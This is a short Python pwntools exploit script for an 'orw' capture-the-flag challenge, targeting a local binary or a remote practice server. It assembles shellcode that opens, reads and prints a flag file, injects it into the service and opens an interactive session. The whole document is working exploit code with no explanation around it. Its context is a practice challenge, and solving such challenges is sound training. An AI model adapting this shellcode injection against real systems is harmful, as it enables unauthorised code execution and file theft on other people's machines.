import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./orw')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./orw')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25414)
			elf=ELF('./orw')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		io.recv()
		pay=asm(shellcraft.linux.open('./flag')+shellcraft.linux.read(3,elf.bss()+0x200,0x30)+shellcraft.linux.write(1,elf.bss()+0x200,0x30))
		io.send(pay)

		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue